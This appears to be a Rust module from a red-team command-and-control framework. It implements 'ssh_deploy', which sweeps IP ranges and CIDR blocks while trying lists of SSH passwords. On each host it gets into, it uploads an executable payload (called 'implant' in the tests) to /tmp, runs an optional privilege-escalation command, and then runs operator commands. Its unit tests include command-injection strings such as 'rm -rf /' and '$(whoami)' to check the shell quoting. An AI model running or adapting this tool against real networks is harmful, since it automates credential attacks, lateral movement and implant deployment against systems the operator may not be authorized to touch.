use crate::std::Session;
use alloc::collections::BTreeMap;
use alloc::format;
use alloc::string::{String, ToString};
use alloc::vec::Vec;
use anyhow::{Result, anyhow};
use eldritch_core::Value;
use ipnetwork::IpNetwork;
use std::net::IpAddr;
use std::str::FromStr;

#[derive(Clone, Debug)]
struct Credential {
    principal: String,
    password: String,
}

fn parse_credentials(credentials: Vec<BTreeMap<String, Value>>) -> Result<Vec<Credential>> {
    if credentials.is_empty() {
        return Err(anyhow!("credentials list cannot be empty"));
    }

    let mut parsed = Vec::with_capacity(credentials.len());
    for (idx, cred) in credentials.into_iter().enumerate() {
        let principal = match cred.get("principal") {
            Some(Value::String(s)) => s.clone(),
            Some(_) => {
                return Err(anyhow!(
                    "credential at index {idx} has non-string 'principal'"
                ));
            }
            None => {
                return Err(anyhow!("credential at index {idx} missing 'principal'"));
            }
        };
        let password = match cred.get("password") {
            Some(Value::String(s)) => s.clone(),
            Some(_) => {
                return Err(anyhow!(
                    "credential at index {idx} has non-string 'password'"
                ));
            }
            None => {
                return Err(anyhow!("credential at index {idx} missing 'password'"));
            }
        };
        parsed.push(Credential {
            principal,
            password,
        });
    }
    Ok(parsed)
}

const DEFAULT_SSH_PORT: u16 = 22;

/// Split an entry into its host portion and an optional port.
///
/// Supports:
///   - `1.2.3.4`              -> ("1.2.3.4", None)
///   - `1.2.3.4:2222`         -> ("1.2.3.4", Some(2222))
///   - `[::1]`                -> ("::1", None)
///   - `[::1]:2222`           -> ("::1", Some(2222))
///   - `::1`                  -> ("::1", None)  (bare IPv6, no port)
fn split_host_port(s: &str) -> Result<(String, Option<u16>)> {
    // Bracketed IPv6: [addr] or [addr]:port
    if let Some(rest) = s.strip_prefix('[') {
        let end = rest
            .find(']')
            .ok_or_else(|| anyhow!("invalid bracketed address '{s}': missing ']'"))?;
        let host = &rest[..end];
        let after = &rest[end + 1..];
        if after.is_empty() {
            return Ok((host.to_string(), None));
        }
        let port_str = after.strip_prefix(':').ok_or_else(|| {
            anyhow!("invalid bracketed address '{s}': expected ':port' after ']'")
        })?;
        let port: u16 = port_str
            .parse()
            .map_err(|e| anyhow!("invalid port in '{s}': {e}"))?;
        return Ok((host.to_string(), Some(port)));
    }

    // Unbracketed: a single ':' indicates ipv4:port; multiple ':' is a bare IPv6.
    let colons = s.matches(':').count();
    if colons == 1 {
        let (host, port_str) = s.split_once(':').unwrap();
        let port: u16 = port_str
            .parse()
            .map_err(|e| anyhow!("invalid port in '{s}': {e}"))?;
        return Ok((host.to_string(), Some(port)));
    }
    Ok((s.to_string(), None))
}

fn expand_targets(ips: Vec<String>) -> Result<Vec<String>> {
    if ips.is_empty() {
        return Err(anyhow!("ips list cannot be empty"));
    }

    let mut out: Vec<String> = Vec::new();
    for entry in ips {
        let trimmed = entry.trim();
        if trimmed.is_empty() {
            return Err(anyhow!("ips contains an empty entry"));
        }

        // Separate optional CIDR suffix from the host[:port] portion.
        // Supports forms like `10.0.0.1/24` and `10.0.0.1:2222/24`.
        let (host_port, cidr_suffix) = match trimmed.split_once('/') {
            Some((hp, cidr)) => (hp, Some(cidr)),
            None => (trimmed, None),
        };

        let (host, port) = split_host_port(host_port)?;
        let port = port.unwrap_or(DEFAULT_SSH_PORT);

        if let Some(cidr) = cidr_suffix {
            let cidr_str = format!("{host}/{cidr}");
            let net = IpNetwork::from_str(&cidr_str)
                .map_err(|e| anyhow!("invalid CIDR '{trimmed}': {e}"))?;
            for addr in net.iter() {
                out.push(format_target(&addr, port));
            }
        } else {
            let addr = IpAddr::from_str(&host)
                .map_err(|e| anyhow!("invalid IP address '{trimmed}': {e}"))?;
            out.push(format_target(&addr, port));
        }
    }
    Ok(out)
}

/// Format an `IpAddr` with a port, bracketing IPv6 addresses as required by
/// the `host:port` convention.
fn format_target(addr: &IpAddr, port: u16) -> String {
    match addr {
        IpAddr::V4(v4) => format!("{v4}:{port}"),
        IpAddr::V6(v6) => format!("[{v6}]:{port}"),
    }
}

fn resolve_payload_dst(payload: &str, payload_dst: Option<&str>) -> String {
    if let Some(dst) = payload_dst {
        return dst.to_string();
    }
    // Default to /tmp/<basename>.
    let basename = std::path::Path::new(payload)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("payload");
    format!("/tmp/{basename}")
}

/// Single-quote a string for safe inclusion in a POSIX shell command.
fn shell_quote(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('\'');
    for ch in s.chars() {
        if ch == '\'' {
            // Close quote, insert an escaped single quote, reopen quote.
            out.push_str("'\\''");
        } else {
            out.push(ch);
        }
    }
    out.push('\'');
    out
}

struct DeployOutcome {
    principal: String,
    stdout: String,
    stderr: String,
}

const DEFAULT_TIMEOUT_SECS: u64 = 5;
const DEFAULT_RETRIES: u32 = 0;

fn resolve_timeout_secs(timeout: Option<i64>) -> Result<u64> {
    match timeout {
        None => Ok(DEFAULT_TIMEOUT_SECS),
        Some(t) if t <= 0 => Err(anyhow!("timeout must be a positive integer, got {t}")),
        Some(t) => Ok(t as u64),
    }
}

fn resolve_retries(retries: Option<i64>) -> Result<u32> {
    match retries {
        None => Ok(DEFAULT_RETRIES),
        Some(r) if r < 0 => Err(anyhow!("retries must be non-negative, got {r}")),
        Some(r) => Ok(r as u32),
    }
}

#[allow(clippy::too_many_arguments)]
async fn handle_deploy_host(
    target: String,
    credentials: Vec<Credential>,
    cmd: String,
    privesc_cmd: Option<String>,
    payload: Option<String>,
    payload_dst: Option<String>,
    timeout_secs: u64,
    retries: u32,
) -> Result<DeployOutcome> {
    let mut last_err: Option<String> = None;
    let attempts = retries.saturating_add(1);
    for attempt in 0..attempts {
        for cred in &credentials {
            let connect = tokio::time::timeout(
                std::time::Duration::from_secs(timeout_secs),
                Session::connect(
                    cred.principal.clone(),
                    Some(cred.password.clone()),
                    None,
                    None,
                    target.clone(),
                ),
            )
            .await;

            let mut ssh = match connect {
                Ok(Ok(s)) => s,
                Ok(Err(e)) => {
                    last_err = Some(format!("auth failed for '{}': {e}", cred.principal));
                    continue;
                }
                Err(_) => {
                    last_err = Some(format!("connection to {target} timed out"));
                    continue;
                }
            };

            // Optional payload copy.
            if let Some(src) = payload.as_deref() {
                let dst = resolve_payload_dst(src, payload_dst.as_deref());
                if let Err(e) = ssh.copy(src, &dst).await {
                    let _ = ssh.close().await;
                    return Err(anyhow!("failed to copy payload to {target}:{dst}: {e}"));
                }
                // Best-effort chmod so the payload is executable. Shell-quote the
                // destination to avoid metacharacter expansion by the remote shell.
                let quoted_dst = shell_quote(&dst);
                let _ = ssh.call(&format!("chmod +x {quoted_dst}")).await;
            }

            // Determine if we are root; if not and privesc is provided, run it first.
            let mut effective_cmd = cmd.clone();
            if let Some(ref privesc) = privesc_cmd {
                let whoami = ssh.call("id -u").await;
                let is_root = matches!(
                    whoami,
                    Ok(ref r) if r.output().map(|s| s.trim() == "0").unwrap_or(false)
                );
                if !is_root {
                    effective_cmd = format!("{privesc} && {cmd}");
                }
            }

            let result = ssh.call(&effective_cmd).await;
            let _ = ssh.close().await;

            let run = match result {
                Ok(r) => r,
                Err(e) => return Err(anyhow!("command execution on {target} failed: {e}")),
            };

            return Ok(DeployOutcome {
                principal: cred.principal.clone(),
                stdout: run.output().unwrap_or_default(),
                stderr: run.error().unwrap_or_default(),
            });
        }
        // Avoid unused-variable warning when retries == 0.
        let _ = attempt;
    }

    Err(anyhow!(
        "{}",
        last_err.unwrap_or_else(|| "no credentials succeeded".to_string())
    ))
}

fn make_result(
    ip: &str,
    status: &str,
    principal: &str,
    stdout: &str,
    stderr: &str,
    error: &str,
) -> BTreeMap<String, Value> {
    let mut m = BTreeMap::new();
    m.insert("ip".into(), Value::String(ip.to_string()));
    m.insert("status".into(), Value::String(status.to_string()));
    m.insert("principal".into(), Value::String(principal.to_string()));
    m.insert("stdout".into(), Value::String(stdout.to_string()));
    m.insert("stderr".into(), Value::String(stderr.to_string()));
    m.insert("error".into(), Value::String(error.to_string()));
    m
}

#[allow(clippy::too_many_arguments)]
pub fn ssh_deploy(
    ips: Vec<String>,
    credentials: Vec<BTreeMap<String, Value>>,
    cmd: String,
    privesc_cmd: Option<String>,
    payload: Option<String>,
    payload_dst: Option<String>,
    timeout: Option<i64>,
    retries: Option<i64>,
) -> Result<Vec<BTreeMap<String, Value>>> {
    let creds = parse_credentials(credentials)?;
    let targets = expand_targets(ips)?;
    let timeout_secs = resolve_timeout_secs(timeout)?;
    let retry_count = resolve_retries(retries)?;

    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()?;

    let mut results = Vec::with_capacity(targets.len());
    for target in targets {
        let outcome = runtime.block_on(handle_deploy_host(
            target.clone(),
            creds.clone(),
            cmd.clone(),
            privesc_cmd.clone(),
            payload.clone(),
            payload_dst.clone(),
            timeout_secs,
            retry_count,
        ));
        match outcome {
            Ok(out) => results.push(make_result(
                &target,
                "success",
                &out.principal,
                &out.stdout,
                &out.stderr,
                "",
            )),
            Err(err) => results.push(make_result(&target, "failed", "", "", "", &err.to_string())),
        }
    }

    Ok(results)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cred(principal: &str, password: &str) -> BTreeMap<String, Value> {
        let mut m = BTreeMap::new();
        m.insert("principal".into(), Value::String(principal.into()));
        m.insert("password".into(), Value::String(password.into()));
        m
    }

    #[test]
    fn test_parse_credentials_ok() {
        let creds = parse_credentials(vec![cred("root", "pw"), cred("user", "hunter2")]).unwrap();
        assert_eq!(creds.len(), 2);
        assert_eq!(creds[0].principal, "root");
        assert_eq!(creds[1].password, "hunter2");
    }

    #[test]
    fn test_parse_credentials_empty() {
        assert!(parse_credentials(vec![]).is_err());
    }

    #[test]
    fn test_parse_credentials_missing_field() {
        let mut m = BTreeMap::new();
        m.insert("principal".into(), Value::String("root".into()));
        assert!(parse_credentials(vec![m]).is_err());
    }

    #[test]
    fn test_parse_credentials_wrong_type() {
        let mut m = BTreeMap::new();
        m.insert("principal".into(), Value::String("root".into()));
        m.insert("password".into(), Value::Int(1234));
        assert!(parse_credentials(vec![m]).is_err());
    }

    #[test]
    fn test_expand_targets_single_ip() {
        let t = expand_targets(vec!["10.0.0.1".into()]).unwrap();
        assert_eq!(t, vec!["10.0.0.1:22".to_string()]);
    }

    #[test]
    fn test_expand_targets_cidr() {
        let t = expand_targets(vec!["192.168.1.0/30".into()]).unwrap();
        // /30 yields 4 addresses.
        assert_eq!(t.len(), 4);
        assert!(t.contains(&"192.168.1.0:22".to_string()));
        assert!(t.contains(&"192.168.1.3:22".to_string()));
    }

    #[test]
    fn test_expand_targets_empty() {
        assert!(expand_targets(vec![]).is_err());
    }

    #[test]
    fn test_expand_targets_invalid() {
        assert!(expand_targets(vec!["not-an-ip".into()]).is_err());
        assert!(expand_targets(vec!["10.0.0.1/40".into()]).is_err());
    }

    #[test]
    fn test_expand_targets_host_port() {
        let t = expand_targets(vec!["127.0.0.1:2222".into()]).unwrap();
        assert_eq!(t, vec!["127.0.0.1:2222".to_string()]);
    }

    #[test]
    fn test_expand_targets_cidr_with_port() {
        let t = expand_targets(vec!["10.0.0.1:2222/30".into()]).unwrap();
        assert_eq!(t.len(), 4);
        assert!(t.contains(&"10.0.0.0:2222".to_string()));
        assert!(t.contains(&"10.0.0.3:2222".to_string()));
    }

    #[test]
    fn test_expand_targets_ipv6_bracketed() {
        let t = expand_targets(vec!["[::1]:2222".into()]).unwrap();
        assert_eq!(t, vec!["[::1]:2222".to_string()]);
    }

    #[test]
    fn test_expand_targets_ipv6_bare() {
        let t = expand_targets(vec!["::1".into()]).unwrap();
        assert_eq!(t, vec!["[::1]:22".to_string()]);
    }

    #[test]
    fn test_expand_targets_invalid_port() {
        assert!(expand_targets(vec!["127.0.0.1:notaport".into()]).is_err());
        assert!(expand_targets(vec!["127.0.0.1:99999".into()]).is_err());
    }

    #[test]
    fn test_resolve_payload_dst_default() {
        assert_eq!(
            resolve_payload_dst("/home/user/implant", None),
            "/tmp/implant".to_string()
        );
    }

    #[test]
    fn test_resolve_payload_dst_override() {
        assert_eq!(
            resolve_payload_dst("/home/user/implant", Some("/var/tmp/agent")),
            "/var/tmp/agent".to_string()
        );
    }

    #[test]
    fn test_shell_quote_plain() {
        assert_eq!(shell_quote("/tmp/payload"), "'/tmp/payload'");
    }

    #[test]
    fn test_shell_quote_with_metachars() {
        // Metacharacters like ; $ ` are preserved literally inside single quotes.
        assert_eq!(shell_quote("/tmp/a;rm -rf /"), "'/tmp/a;rm -rf /'");
        assert_eq!(shell_quote("/tmp/$(whoami)"), "'/tmp/$(whoami)'");
    }

    #[test]
    fn test_shell_quote_with_single_quote() {
        // A single quote must close, escape, and reopen.
        assert_eq!(shell_quote("/tmp/a'b"), "'/tmp/a'\\''b'");
    }

    #[test]
    fn test_ssh_deploy_validates_inputs() {
        let res = ssh_deploy(
            vec![],
            vec![cred("root", "pw")],
            "echo hi".into(),
            None,
            None,
            None,
            None,
            None,
        );
        assert!(res.is_err());

        let res = ssh_deploy(
            vec!["127.0.0.1".into()],
            vec![],
            "echo hi".into(),
            None,
            None,
            None,
            None,
            None,
        );
        assert!(res.is_err());
    }

    #[test]
    fn test_resolve_timeout_defaults() {
        assert_eq!(resolve_timeout_secs(None).unwrap(), DEFAULT_TIMEOUT_SECS);
        assert_eq!(resolve_timeout_secs(Some(10)).unwrap(), 10);
    }

    #[test]
    fn test_resolve_timeout_invalid() {
        assert!(resolve_timeout_secs(Some(0)).is_err());
        assert!(resolve_timeout_secs(Some(-1)).is_err());
    }

    #[test]
    fn test_resolve_retries_defaults() {
        assert_eq!(resolve_retries(None).unwrap(), DEFAULT_RETRIES);
        assert_eq!(resolve_retries(Some(0)).unwrap(), 0);
        assert_eq!(resolve_retries(Some(3)).unwrap(), 3);
    }

    #[test]
    fn test_resolve_retries_invalid() {
        assert!(resolve_retries(Some(-1)).is_err());
    }

    #[test]
    fn test_ssh_deploy_invalid_timeout() {
        let res = ssh_deploy(
            vec!["127.0.0.1".into()],
            vec![cred("root", "pw")],
            "echo hi".into(),
            None,
            None,
            None,
            Some(0),
            None,
        );
        assert!(res.is_err());
    }

    #[test]
    fn test_ssh_deploy_invalid_retries() {
        let res = ssh_deploy(
            vec!["127.0.0.1".into()],
            vec![cred("root", "pw")],
            "echo hi".into(),
            None,
            None,
            None,
            None,
            Some(-1),
        );
        assert!(res.is_err());
    }
}
